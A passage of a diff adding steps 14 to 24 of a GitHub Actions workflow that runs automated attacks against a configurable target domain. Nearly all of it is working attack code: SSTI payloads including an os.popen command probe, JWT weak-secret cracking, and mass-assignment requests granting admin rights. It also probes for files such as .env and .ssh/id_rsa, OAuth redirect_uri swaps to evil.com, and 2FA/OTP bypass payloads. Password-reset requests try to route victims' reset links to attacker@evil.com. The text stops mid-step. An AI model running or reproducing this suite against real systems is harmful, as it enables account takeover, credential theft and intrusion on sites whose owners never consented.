+                  >> /tmp/ultra/$D/cache/findings.txt
+              fi
+            done
+          done
+
+          echo "CACHE_COUNT=$(wc -l < /tmp/ultra/$D/cache/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 14 — SSTI Detection (Server-Side Template Injection)
+      # Common in email templates, custom pages, error pages
+      # ════════════════════════════════════════════════════════════
+      - name: "1️⃣4️⃣ SSTI Detection"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/ssti/findings.txt
+
+          # SSTI payloads (math operations that differ per engine)
+          PAYLOADS=(
+            "{{7*7}}"           # Jinja2 / Twig / Django
+            "\${7*7}"           # FreeMarker / Velocity / Thymeleaf
+            "{{7*'7'}}"         # Jinja2 (returns 7777777)
+            "#{7*7}"            # Ruby ERB
+            "*{7*7}"            # Thymeleaf
+            "[[7*7]]"           # Thymeleaf inline
+            "__import__('os').popen('id').read()"  # Python SSTI
+          )
+
+          if [ -s /tmp/ultra/$D/gf/ssti.txt ]; then
+            head -30 /tmp/ultra/$D/gf/ssti.txt | while read URL; do
+              for P in "${PAYLOADS[@]}"; do
+                ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$P'))" 2>/dev/null || echo "$P")
+                RESP=$(curl -sk "${URL}${ENC}" --max-time 8 2>/dev/null | head -c 2000)
+                # Check for math result
+                if echo "$RESP" | grep -qE "\b49\b|7777777"; then
+                  echo "[SSTI! ⚠️] $URL | Payload: $P | Result: 49" \
+                    >> /tmp/ultra/$D/ssti/findings.txt
+                fi
+              done
+            done
+          fi
+
+          # Also test in form parameters
+          head -10 /tmp/ultra/$D/urls/all_urls.txt | \
+            grep "?" | while read URL; do
+            for P in "{{49}}" "\${49}" "#{49}"; do
+              RESP=$(echo "$URL" | qsreplace "$P" | \
+                xargs -I{} curl -sk "{}" --max-time 8 2>/dev/null | head -c 1000)
+              echo "$RESP" | grep -q "49" && \
+                echo "[SSTI?] $URL | $P" >> /tmp/ultra/$D/ssti/findings.txt
+            done
+          done
+
+          echo "SSTI_COUNT=$(wc -l < /tmp/ultra/$D/ssti/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 15 — JWT Analysis (alg:none, weak secrets)
+      # Very common in modern APIs
+      # ════════════════════════════════════════════════════════════
+      - name: "1️⃣5️⃣ JWT Analysis"
+        run: |
+          D=${{ env.DOMAIN }}
+          export DOMAIN="$D"
+          > /tmp/ultra/$D/jwt/findings.txt
+
+          python3 << 'PYEOF'
+import subprocess, json, base64, os, re, time
+
+domain = os.environ["DOMAIN"]
+findings = open(f'/tmp/ultra/{domain}/jwt/findings.txt', 'w')
+
+def decode_b64(s):
+    s += '==' * (4 - len(s)%4 if len(s)%4 else 0)
+    try:
+        return json.loads(base64.urlsafe_b64decode(s))
+    except:
+        return {}
+
+# Collect JWTs from live hosts
+try:
+    with open(f'/tmp/ultra/{domain}/urls/live_urls.txt') as f:
+        urls = [l.strip() for l in f if l.strip()][:20]
+except:
+    urls = []
+
+jwts_found = set()
+
+for url in urls:
+    try:
+        r = subprocess.run(
+            ['curl','-sk','-D','-',url,'--max-time','8'],
+            capture_output=True, text=True, timeout=12
+        )
+        content = r.stdout
+        # Find JWT patterns
+        tokens = re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', content)
+        for token in tokens:
+            if token in jwts_found:
+                continue
+            jwts_found.add(token)
+
+            parts = token.split('.')
+            if len(parts) != 3:
+                continue
+
+            header  = decode_b64(parts[0])
+            payload = decode_b64(parts[1])
+
+            alg = header.get('alg','?')
+            kid = header.get('kid','')
+
+            findings.write(f'[JWT FOUND] {url}\n')
+            findings.write(f'  Algorithm: {alg}\n')
+            findings.write(f'  Kid: {kid}\n')
+            findings.write(f'  Claims: {list(payload.keys())}\n')
+
+            # Vulnerability checks
+            if alg.lower() in ('none','none','NONE'):
+                findings.write(f'  [CRITICAL] alg:none — NO SIGNATURE REQUIRED!\n')
+
+            if alg.upper() in ('HS256','HS384','HS512'):
+                # Weak secret test
+                weak_secrets = ['secret','password','123456','admin',
+                               'key','token','jwt','test',domain]
+                for secret in weak_secrets:
+                    try:
+                        import hmac, hashlib
+                        msg = f"{parts[0]}.{parts[1]}".encode()
+                        sig = base64.urlsafe_b64encode(
+                            hmac.new(secret.encode(), msg, hashlib.sha256).digest()
+                        ).rstrip(b'=').decode()
+                        if sig == parts[2]:
+                            findings.write(f'  [CRITICAL] Weak secret: "{secret}"\n')
+                    except:
+                        pass
+
+            # Check for sensitive data in payload
+            sensitive = ['password','passwd','secret','ssn','credit_card','cvv']
+            for k in payload:
+                if any(s in k.lower() for s in sensitive):
+                    findings.write(f'  [WARNING] Sensitive claim: {k}={payload[k]}\n')
+
+            # Check expiry
+            import datetime
+            exp = payload.get('exp', 0)
+            if exp:
+                expiry = datetime.datetime.fromtimestamp(exp)
+                if expiry.year > 2030:
+                    findings.write(f'  [INFO] Very long expiry: {expiry}\n')
+
+            time.sleep(0.2)
+
+findings.close()
+PYEOF
+
+          echo "JWT_COUNT=$(grep -c '\[JWT FOUND\]' /tmp/ultra/$D/jwt/findings.txt 2>/dev/null || echo 0)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 16 — GraphQL Hunter
+      # Very common in modern apps, often misconfigured
+      # ════════════════════════════════════════════════════════════
+      - name: "1️⃣6️⃣ GraphQL Hunter"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/graphql/findings.txt
+
+          GQL_PATHS="graphql gql api/graphql v1/graphql v2/graphql graphql/console graphiql playground altair"
+
+          head -15 /tmp/ultra/$D/urls/live_urls.txt | while read HOST; do
+            for PATH in $GQL_PATHS; do
+              EP="$HOST/$PATH"
+              S=$(curl -sk -o /dev/null -w "%{http_code}" "$EP" --max-time 8)
+              if echo "200 400 405" | grep -qw "$S"; then
+                # Test introspection
+                RESP=$(curl -sk -X POST "$EP" \
+                  -H "Content-Type: application/json" \
+                  -d '{"query":"{ __schema { types { name } } }"}' \
+                  --max-time 10 2>/dev/null | head -c 500)
+
+                if echo "$RESP" | grep -q "__schema\|types"; then
+                  echo "[GQL INTROSPECTION] $EP" >> /tmp/ultra/$D/graphql/findings.txt
+
+                  # Extract types for IDOR testing
+                  curl -sk -X POST "$EP" \
+                    -H "Content-Type: application/json" \
+                    -d '{"query":"{ __schema { types { name fields { name } } } }"}' \
+                    --max-time 10 2>/dev/null | \
+                    python3 -c "
+import sys,json
+try:
+    d=json.load(sys.stdin)
+    types=[t for t in d.get('data',{}).get('__schema',{}).get('types',[]) if not t['name'].startswith('__')]
+    for t in types[:10]:
+        print(f'  Type: {t[\"name\"]} | Fields: {[f[\"name\"] for f in (t.get(\"fields\") or [])[:5]]}')
+except: pass
+" >> /tmp/ultra/$D/graphql/findings.txt 2>/dev/null || true
+                fi
+
+                # Test batch attack (DoS potential)
+                BATCH=$(curl -sk -X POST "$EP" \
+                  -H "Content-Type: application/json" \
+                  -d '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]' \
+                  --max-time 10 2>/dev/null | head -c 100)
+                echo "$BATCH" | grep -q "__typename" && \
+                  echo "[GQL BATCHING] $EP — batch queries allowed" \
+                  >> /tmp/ultra/$D/graphql/findings.txt
+              fi
+            done
+          done
+
+          echo "GQL_COUNT=$(wc -l < /tmp/ultra/$D/graphql/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 17 — Mass Assignment + Sensitive Files
+      # Top API vulnerability from HackerOne reports
+      # ════════════════════════════════════════════════════════════
+      - name: "1️⃣7️⃣ Mass Assignment + Sensitive Files"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/mass/findings.txt
+          > /tmp/ultra/$D/files/findings.txt
+
+          # ── Mass Assignment ────────────────────────────────────
+          REGISTER_EPS=$(grep -iE "(register|signup|create.user|profile|update)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -8)
+
+          PRIV_FIELDS='{"role":"admin","isAdmin":true,"admin":true,"is_superuser":true,"privilege":"high","status":"active","verified":true,"email_verified":true,"plan":"enterprise","credits":99999}'
+
+          for EP in $REGISTER_EPS; do
+            S=$(curl -sk -X POST "$EP" \
+              -H "Content-Type: application/json" \
+              -d "$PRIV_FIELDS" \
+              -o /tmp/mass_resp.json \
+              -w "%{http_code}" --max-time 10 2>/dev/null)
+
+            if echo "200 201 204" | grep -qw "$S"; then
+              REFLECTED=$(cat /tmp/mass_resp.json 2>/dev/null | \
+                python3 -c "
+import sys,json
+try:
+  d=json.load(sys.stdin)
+  keys=['role','isAdmin','admin','privilege','plan','verified']
+  found=[k for k in keys if k in str(d)]
+  print(','.join(found) if found else '')
+except: print('')
+" 2>/dev/null)
+              [ -n "$REFLECTED" ] && \
+                echo "[MASS ASSIGN] $EP | Reflected: $REFLECTED" \
+                >> /tmp/ultra/$D/mass/findings.txt
+            fi
+          done
+
+          echo "MASS_COUNT=$(wc -l < /tmp/ultra/$D/mass/findings.txt)" >> $GITHUB_ENV
+
+          # ── Sensitive Files (from nahamsec recon tips) ─────────
+          SENSITIVE_FILES=".env .env.local .env.production .env.backup
+.git/HEAD .git/config .git/COMMIT_EDITMSG .gitignore
+config.php wp-config.php database.yml database.php
+.DS_Store Thumbs.db desktop.ini
+backup.sql dump.sql database.sql *.bak
+phpinfo.php info.php test.php debug.php
+.htpasswd .htaccess web.config
+robots.txt sitemap.xml crossdomain.xml clientaccesspolicy.xml
+package.json composer.json requirements.txt Gemfile
+swagger.json api-docs.json openapi.json
+server-status server-info .bash_history .ssh/id_rsa
+admin.php admin/config.php install.php setup.php"
+
+          head -10 /tmp/ultra/$D/urls/live_urls.txt | while read HOST; do
+            for FILE in $SENSITIVE_FILES; do
+              URL="${HOST}/${FILE}"
+              S=$(curl -sk -o /tmp/file_resp.txt \
+                -w "%{http_code}" "$URL" --max-time 8 2>/dev/null)
+              SIZE=$(wc -c < /tmp/file_resp.txt 2>/dev/null || echo 0)
+              if [ "$S" = "200" ] && [ "$SIZE" -gt 10 ]; then
+                PREVIEW=$(head -c 100 /tmp/file_resp.txt 2>/dev/null | tr '\n' ' ')
+                echo "[SENSITIVE FILE] $URL ($SIZE bytes) | $PREVIEW" \
+                  >> /tmp/ultra/$D/files/findings.txt
+              fi
+            done
+          done
+
+          echo "FILES_COUNT=$(wc -l < /tmp/ultra/$D/files/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 18 — Security Headers + Clickjacking
+      # Quick wins, required by many bug bounty programs
+      # ════════════════════════════════════════════════════════════
+      - name: "1️⃣8️⃣ Security Headers + Clickjacking"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/headers/findings.txt
+
+          head -10 /tmp/ultra/$D/urls/live_urls.txt | while read URL; do
+            HEADERS=$(curl -sk -I "$URL" --max-time 8 2>/dev/null | tr '[:upper:]' '[:lower:]')
+
+            # X-Frame-Options (Clickjacking)
+            echo "$HEADERS" | grep -q "x-frame-options" || \
+              echo "[CLICKJACKING] $URL — X-Frame-Options missing" \
+              >> /tmp/ultra/$D/headers/findings.txt
+
+            # Content-Security-Policy
+            echo "$HEADERS" | grep -q "content-security-policy" || \
+              echo "[NO CSP] $URL — CSP missing" \
+              >> /tmp/ultra/$D/headers/findings.txt
+
+            # HSTS
+            echo "$HEADERS" | grep -q "strict-transport-security" || \
+              echo "[NO HSTS] $URL — HSTS missing" \
+              >> /tmp/ultra/$D/headers/findings.txt
+
+            # X-Content-Type-Options
+            echo "$HEADERS" | grep -q "x-content-type-options" || \
+              echo "[NO XCTO] $URL — X-Content-Type-Options missing" \
+              >> /tmp/ultra/$D/headers/findings.txt
+
+            # Information disclosure in headers
+            for HDR in "server" "x-powered-by" "x-aspnet-version" \
+                       "x-aspnetmvc-version" "x-generator"; do
+              VAL=$(echo "$HEADERS" | grep "^$HDR:" | head -1)
+              [ -n "$VAL" ] && \
+                echo "[INFO DISCLOSURE] $URL | $VAL" \
+                >> /tmp/ultra/$D/headers/findings.txt
+            done
+          done
+
+          echo "HEADERS_COUNT=$(wc -l < /tmp/ultra/$D/headers/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 19 — Business Logic (from top writeups)
+      # Negative values, zero price, state machine abuse
+      # ════════════════════════════════════════════════════════════
+      - name: "1️⃣9️⃣ Business Logic Tests"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/logic/bizlogic.txt
+
+          PAYMENT_EPS=$(cat /tmp/ultra/$D/logic/payment_urls.txt 2>/dev/null | head -10)
+
+          for EP in $PAYMENT_EPS; do
+            # Test negative quantity/amount
+            for PAYLOAD in \
+              '{"quantity":-1,"amount":-100}' \
+              '{"price":0,"quantity":1}' \
+              '{"amount":0.001}' \
+              '{"quantity":99999999}' \
+              '{"price":-1,"qty":-1}' \
+              '{"amount":"0","price":"0.00"}'; do
+
+              S=$(curl -sk -X POST "$EP" \
+                -H "Content-Type: application/json" \
+                -d "$PAYLOAD" \
+                -o /tmp/bl_resp.json \
+                -w "%{http_code}" --max-time 10 2>/dev/null)
+
+              if echo "200 201 204" | grep -qw "$S"; then
+                RESP_PREVIEW=$(head -c 150 /tmp/bl_resp.json 2>/dev/null | tr '\n' ' ')
+                echo "[BUSINESS LOGIC?] $EP | $PAYLOAD | $S | $RESP_PREVIEW" \
+                  >> /tmp/ultra/$D/logic/bizlogic.txt
+              fi
+            done
+          done
+
+          # ── Parameter Pollution ────────────────────────────────
+          > /tmp/ultra/$D/logic/hpp.txt
+          head -20 /tmp/ultra/$D/urls/all_urls.txt | grep "?" | while read URL; do
+            # Add duplicate params
+            PARAM=$(echo "$URL" | grep -oE "[?&][a-z_]+=" | head -1 | tr -d '?&=')
+            [ -z "$PARAM" ] && continue
+            POLLUTED="${URL}&${PARAM}=POLLUTED&${PARAM}=INJECTED"
+            RESP=$(curl -sk "$POLLUTED" --max-time 8 2>/dev/null | head -c 500)
+            echo "$RESP" | grep -qi "POLLUTED\|INJECTED" && \
+              echo "[HPP] $URL — $PARAM duplicated" >> /tmp/ultra/$D/logic/hpp.txt
+          done
+
+          echo "BIZLOGIC_COUNT=$(wc -l < /tmp/ultra/$D/logic/bizlogic.txt)" >> $GITHUB_ENV
+          echo "HPP_COUNT=$(wc -l < /tmp/ultra/$D/logic/hpp.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 20 — OAuth Misconfiguration
+      # Common ATO vector from HackerOne reports
+      # ════════════════════════════════════════════════════════════
+      - name: "2️⃣0️⃣ OAuth / SSO Misconfiguration"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/oauth/findings.txt
+
+          cat /tmp/ultra/$D/oauth/oauth_urls.txt 2>/dev/null | head -20 | while read URL; do
+            # Test open redirect in redirect_uri
+            for EVIL_REDIR in "https://evil.com" "https://evil.com@$D" \
+                              "https://$D.evil.com" "//evil.com" \
+                              "javascript:alert(1)" "data:text/html,test"; do
+              MODIFIED=$(echo "$URL" | sed "s|redirect_uri=[^&]*|redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$EVIL_REDIR'))" 2>/dev/null || echo $EVIL_REDIR)|g")
+              S=$(curl -sk -o /dev/null -w "%{http_code}" \
+                -L "$MODIFIED" --max-time 8 2>/dev/null)
+              if echo "200 302" | grep -qw "$S"; then
+                LOCATION=$(curl -sk -o /dev/null -w "%{redirect_url}" \
+                  "$MODIFIED" --max-time 8 2>/dev/null)
+                echo "$LOCATION" | grep -qi "evil" && \
+                  echo "[OAUTH REDIRECT] $URL | $EVIL_REDIR -> $LOCATION" \
+                  >> /tmp/ultra/$D/oauth/findings.txt
+              fi
+            done
+
+            # Check state parameter
+            if echo "$URL" | grep -q "state="; then
+              # Test CSRF via missing state
+              NO_STATE=$(echo "$URL" | sed 's/state=[^&]*//g')
+              S=$(curl -sk -o /dev/null -w "%{http_code}" "$NO_STATE" --max-time 8)
+              echo "200 302" | grep -qw "$S" && \
+                echo "[OAUTH NO STATE] $NO_STATE — state param removed, still works" \
+                >> /tmp/ultra/$D/oauth/findings.txt
+            fi
+          done
+
+          echo "OAUTH_COUNT=$(wc -l < /tmp/ultra/$D/oauth/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 21 — OAuth Attack Suite
+      # From HackerOne top reports: redirect_uri, state, scope, PKCE
+      # ════════════════════════════════════════════════════════════
+      - name: "2️⃣1️⃣ OAuth Attack Suite"
+        run: |
+          D=${{ env.DOMAIN }}
+          mkdir -p /tmp/ultra/$D/oauth
+          > /tmp/ultra/$D/oauth/advanced.txt
+
+          # ── redirect_uri tricks ────────────────────────────────
+          cat /tmp/ultra/$D/oauth/oauth_urls.txt 2>/dev/null | \
+            grep -i "redirect_uri" | head -15 | while read URL; do
+
+            BASE_REDIR=$(echo "$URL" | grep -oE "redirect_uri=[^&]+" | head -1 | cut -d= -f2)
+
+            # Encoding tricks from checklist
+            for TRICK in \
+              "https://evil.com" \
+              "https://evil.com/" \
+              "https://Evil.com" \
+              "https://evil.com%2F" \
+              "https://evil.com%2f.${D}" \
+              "https://${D}.evil.com" \
+              "https://evil.com@${D}" \
+              "https://evil.com/${D}" \
+              "//evil.com" \
+              "https://evil.com%0d%0aHost:evil.com"; do
+
+              ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$TRICK',safe=''))" 2>/dev/null || echo "$TRICK")
+              MODIFIED=$(echo "$URL" | sed "s|redirect_uri=[^&]*|redirect_uri=$ENC|g")
+              S=$(curl -sk -o /dev/null -w "%{http_code}" -L "$MODIFIED" --max-time 8 2>/dev/null)
+              FINAL=$(curl -sk -o /dev/null -w "%{redirect_url}" -L "$MODIFIED" --max-time 8 2>/dev/null)
+
+              if echo "$FINAL" | grep -qi "evil"; then
+                echo "[OAUTH REDIRECT BYPASS] $TRICK | URL: $MODIFIED" \
+                  >> /tmp/ultra/$D/oauth/advanced.txt
+              fi
+            done
+
+            # ── Scope injection ──────────────────────────────────
+            for SCOPE in "admin" "write:all" "user:admin" "read:all" \
+                         "offline_access" "openid profile email admin"; do
+              ALT=$(echo "$URL" | sed "s|scope=[^&]*|scope=$SCOPE|g")
+              S=$(curl -sk -o /dev/null -w "%{http_code}" "$ALT" --max-time 8)
+              echo "200 302" | grep -qw "$S" && \
+                echo "[SCOPE INJECTION?] scope=$SCOPE | $ALT ($S)" \
+                >> /tmp/ultra/$D/oauth/advanced.txt
+            done
+          done
+
+          # ── State parameter missing = CSRF ─────────────────────
+          cat /tmp/ultra/$D/oauth/oauth_urls.txt 2>/dev/null | head -10 | while read URL; do
+            if ! echo "$URL" | grep -q "state="; then
+              echo "[NO STATE — CSRF POSSIBLE] $URL" >> /tmp/ultra/$D/oauth/advanced.txt
+            else
+              # Test if state is validated server-side
+              NOSTATE=$(echo "$URL" | sed 's/state=[^&]*//g' | sed 's/&&/\&/g')
+              S=$(curl -sk -o /dev/null -w "%{http_code}" "$NOSTATE" --max-time 8)
+              echo "200 302" | grep -qw "$S" && \
+                echo "[STATE NOT VALIDATED?] $NOSTATE ($S)" \
+                >> /tmp/ultra/$D/oauth/advanced.txt
+            fi
+          done
+
+          # ── Token exposure in responses ────────────────────────
+          head -20 /tmp/ultra/$D/urls/all_urls.txt 2>/dev/null | \
+            grep -iE "(callback|oauth|auth|redirect)" | while read URL; do
+            RESP=$(curl -sk "$URL" --max-time 8 2>/dev/null | head -c 2000)
+            if echo "$RESP" | grep -qiE "access_token|id_token|bearer [a-zA-Z0-9]"; then
+              echo "[TOKEN EXPOSURE] $URL" >> /tmp/ultra/$D/oauth/advanced.txt
+            fi
+            # Token in URL fragment is client-side, check for it in links
+            if echo "$RESP" | grep -qE "#access_token|#id_token"; then
+              echo "[TOKEN IN FRAGMENT] $URL" >> /tmp/ultra/$D/oauth/advanced.txt
+            fi
+          done
+
+          # ── PKCE missing in public clients ─────────────────────
+          cat /tmp/ultra/$D/oauth/oauth_urls.txt 2>/dev/null | head -10 | while read URL; do
+            if echo "$URL" | grep -qi "response_type=code"; then
+              if ! echo "$URL" | grep -qi "code_challenge"; then
+                CLIENT_TYPE=$(echo "$URL" | grep -oiE "client_id=[^&]+" | head -1)
+                echo "[PKCE MISSING] $URL | $CLIENT_TYPE" \
+                  >> /tmp/ultra/$D/oauth/advanced.txt
+              fi
+            fi
+          done
+
+          OAUTH_ADV=$(wc -l < /tmp/ultra/$D/oauth/advanced.txt 2>/dev/null || echo 0)
+          echo "OAUTH_ADV=$OAUTH_ADV" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 22 — 2FA / OTP Bypass Suite
+      # From checklist: null OTP, array, response manip, API bypass
+      # ════════════════════════════════════════════════════════════
+      - name: "2️⃣2️⃣ 2FA / OTP Bypass Suite"
+        run: |
+          D=${{ env.DOMAIN }}
+          mkdir -p /tmp/ultra/$D/twofa
+          > /tmp/ultra/$D/twofa/findings.txt
+
+          OTP_EPS=$(grep -iE "(otp|2fa|mfa|verify|confirm|code|totp|authenticate)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -10)
+
+          for EP in $OTP_EPS; do
+
+            # ── Null / Empty OTP ──────────────────────────────────
+            for PAYLOAD in \
+              '{"otp":"","code":"","token":""}' \
+              '{"otp":null,"code":null}' \
+              '{"otp":"000000"}' \
+              '{"otp":"123456"}' \
+              '{}' \
+              '{"otp":" "}'; do
+              S=$(curl -sk -X POST "$EP" \
+                -H "Content-Type: application/json" \
+                -d "$PAYLOAD" \
+                -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+              echo "200 201 302" | grep -qw "$S" && \
+                echo "[OTP NULL BYPASS?] $EP | $PAYLOAD -> $S" \
+                >> /tmp/ultra/$D/twofa/findings.txt
+            done
+
+            # ── OTP as array (JSON array bypass) ─────────────────
+            for ARRAY_PAYLOAD in \
+              '{"otp":["123456","000000","111111"]}' \
+              '{"code":["123456","654321","000000"]}' \
+              '{"token":["abc","def","123456"]}'; do
+              S=$(curl -sk -X POST "$EP" \
+                -H "Content-Type: application/json" \
+                -d "$ARRAY_PAYLOAD" \
+                -o /tmp/otp_resp.json \
+                -w "%{http_code}" --max-time 8 2>/dev/null)
+              echo "200 201" | grep -qw "$S" && \
+                echo "[OTP ARRAY BYPASS?] $EP | $ARRAY_PAYLOAD -> $S" \
+                >> /tmp/ultra/$D/twofa/findings.txt
+            done
+
+            # ── Remove OTP param entirely ─────────────────────────
+            S=$(curl -sk -X POST "$EP" \
+              -H "Content-Type: application/json" \
+              -d '{"username":"admin","password":"admin123"}' \
+              -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+            echo "200 201 302" | grep -qw "$S" && \
+              echo "[OTP PARAM REMOVED?] $EP -> $S (no OTP sent)" \
+              >> /tmp/ultra/$D/twofa/findings.txt
+
+            # ── Older API version skips 2FA ───────────────────────
+            BASE=$(echo $EP | grep -oE "https?://[^/]+")
+            for V in v0 v1 v2 v3; do
+              ALT=$(echo $EP | sed "s|/v[0-9][0-9.]*|/$V|g")
+              [ "$ALT" = "$EP" ] && continue
+              S=$(curl -sk -X POST "$ALT" \
+                -H "Content-Type: application/json" \
+                -d '{"otp":"","code":""}' \
+                -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+              echo "200 201" | grep -qw "$S" && \
+                echo "[2FA API VERSION BYPASS] $ALT ($V) -> $S" \
+                >> /tmp/ultra/$D/twofa/findings.txt
+            done
+
+            # ── OTP via content-type change ───────────────────────
+            S=$(curl -sk -X POST "$EP" \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              -d "otp=&code=&token=" \
+              -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+            echo "200 201 302" | grep -qw "$S" && \
+              echo "[2FA CONTENT-TYPE BYPASS?] $EP (form-urlencoded) -> $S" \
+              >> /tmp/ultra/$D/twofa/findings.txt
+
+          done
+
+          # ── Subdomain bypasses 2FA? ────────────────────────────
+          cat /tmp/ultra/$D/urls/live_urls.txt 2>/dev/null | head -20 | \
+            grep -v "^https://$D$" | while read SUBURL; do
+            if echo "$SUBURL" | grep -qE "app\.|my\.|account\.|portal\."; then
+              echo "[SUBDOMAIN 2FA CHECK] $SUBURL — verify if 2FA enforced" \
+                >> /tmp/ultra/$D/twofa/findings.txt
+            fi
+          done
+
+          echo "TWOFA_COUNT=$(wc -l < /tmp/ultra/$D/twofa/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 23 — Password Reset Advanced
+      # HPP, IDOR in reset, token lifetime, response disclosure
+      # ════════════════════════════════════════════════════════════
+      - name: "2️⃣3️⃣ Password Reset Advanced"
+        run: |
+          D=${{ env.DOMAIN }}
+          mkdir -p /tmp/ultra/$D/reset
+          > /tmp/ultra/$D/reset/findings.txt
+
+          RESET_EPS=$(grep -iE "(reset|forgot)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -8)
+
+          for EP in $RESET_EPS; do
+
+            # ── HTTP Parameter Pollution (HPP) ────────────────────
+            # Multiple email params — attacker gets the reset link
+            for HPP_PAYLOAD in \
+              "email=victim%40$D&email=attacker%40evil.com" \
+              "email[]=victim%40$D&email[]=attacker%40evil.com" \
+              "email=victim%40$D%20email=attacker%40evil.com" \
+              "email=victim%40$D,attacker%40evil.com"; do
+
+              S=$(curl -sk -X POST "$EP" \
+                -H "Content-Type: application/x-www-form-urlencoded" \
+                -d "$HPP_PAYLOAD" \
+                -o /tmp/rst_resp.txt \
+                -w "%{http_code}" --max-time 8 2>/dev/null)
+
+              if echo "200 201" | grep -qw "$S"; then
+                BODY=$(head -c 200 /tmp/rst_resp.txt 2>/dev/null)
+                echo "[RESET HPP?] $EP | $HPP_PAYLOAD -> $S | $BODY" \
+                  >> /tmp/ultra/$D/reset/findings.txt
+              fi
+            done
+
+            # ── JSON HPP ──────────────────────────────────────────
+            JSON_HPP='{"email":["victim@'$D'","attacker@evil.com"]}'
+            S=$(curl -sk -X POST "$EP" \
+              -H "Content-Type: application/json" \
+              -d "$JSON_HPP" \
+              -o /tmp/rst_json.txt \
+              -w "%{http_code}" --max-time 8 2>/dev/null)
+            echo "200 201" | grep -qw "$S" && \
+              echo "[RESET JSON HPP?] $EP | JSON array email -> $S" \
+              >> /tmp/ultra/$D/reset/findings.txt
+
+            # ── Reset token disclosed in response? ────────────────
+            RESP=$(curl -sk -X POST "$EP" \
+              -H "Content-Type: application/json" \
+              -d "{\"email\":\"test@$D\"}" \
+              --max-time 10 2>/dev/null | head -c 1000)
+
+            if echo "$RESP" | grep -qiE "token|reset_code|link|otp|code|secret"; then
+              echo "[TOKEN IN RESPONSE!] $EP | $(echo $RESP | head -c 200)" \
+                >> /tmp/ultra/$D/reset/findings.txt
+            fi
+
+            # ── IDOR: Change user_id in reset request ─────────────
+            for IDOR_PAYLOAD in \
+              '{"email":"admin@'$D'","user_id":1}' \
+              '{"email":"admin@'$D'","id":1}' \
+              '{"email":"victim@'$D'","uid":2}' \
+              '{"username":"admin","user_id":1}'; do
+              S=$(curl -sk -X POST "$EP" \
+                -H "Content-Type: application/json" \
+                -d "$IDOR_PAYLOAD" \
+                -o /tmp/rst_idor.txt \
+                -w "%{http_code}" --max-time 8 2>/dev/null)
+              echo "200 201" | grep -qw "$S" && \
+                echo "[RESET IDOR?] $EP | $IDOR_PAYLOAD -> $S" \
+                >> /tmp/ultra/$D/reset/findings.txt
+            done
+
+            # ── Null byte / whitespace in email ───────────────────
+            for SPECIAL in \
+              "victim@$D%00" \
+              " victim@$D " \
+              "victim@$D " \
+              "VICTIM@$D"; do
+              S=$(curl -sk -X POST "$EP" \
+                -d "email=$SPECIAL" \
+                -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+              echo "200 201" | grep -qw "$S" && \
+                echo "[RESET SPECIAL EMAIL?] $EP | email='$SPECIAL' -> $S" \
+                >> /tmp/ultra/$D/reset/findings.txt
+            done
+
+            # ── User enumeration via reset ────────────────────────
+            T_VALID=$(TIMEFORMAT='%R'; {
+              time curl -sk -X POST "$EP" \
+                -d "email=admin@$D" \
+                -o /dev/null --max-time 10 2>/dev/null
+            } 2>&1 | tr -d ' ')
+
+            T_INVALID=$(TIMEFORMAT='%R'; {
+              time curl -sk -X POST "$EP" \
+                -d "email=notexist_xyz789@$D" \
+                -o /dev/null --max-time 10 2>/dev/null
+            } 2>&1 | tr -d ' ')
+
+            python3 -c "
+try:
+    t1=float('${T_VALID}'.replace(',','.'))
+    t2=float('${T_INVALID}'.replace(',','.'))
+    if abs(t1-t2) > 0.3:
+        print(f'[RESET TIMING ENUM] $EP | valid:{t1:.2f}s invalid:{t2:.2f}s')
+except: pass
+" >> /tmp/ultra/$D/reset/findings.txt 2>/dev/null || true
+
+          done
+
+          echo "RESET_COUNT=$(wc -l < /tmp/ultra/$D/reset/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 24 — Session Security Full Audit
+      # Cookie attrs, session invalidation, token analysis
+      # ════════════════════════════════════════════════════════════
+      - name: "2️⃣4️⃣ Session Security Audit"
+        run: |
+          D=${{ env.DOMAIN }}
+          mkdir -p /tmp/ultra/$D/session
+          > /tmp/ultra/$D/session/findings.txt
+
+          # ── Cookie attribute audit ─────────────────────────────
+          head -15 /tmp/ultra/$D/urls/live_urls.txt | while read URL; do
